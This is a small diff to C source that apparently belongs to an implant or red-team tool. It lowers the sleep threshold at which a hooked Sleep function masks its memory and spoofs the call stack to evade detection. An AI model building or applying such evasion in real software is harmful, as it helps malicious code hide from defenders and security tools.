@@ -68,13 +68,13 @@ VOID WINAPI _Sleep ( DWORD dwMilliseconds )
      * or greater than 1 second 
      */
 
-    if ( dwMilliseconds >= 1000 ) {
+    if ( dwMilliseconds >= 500 ) {
         mask_memory ( &g_memory, TRUE );
     }
 
     spoof_call ( &call );
 
-    if ( dwMilliseconds >= 1000 ) {
+    if ( dwMilliseconds >= 500 ) {
         mask_memory ( &g_memory, FALSE );
     }
 }
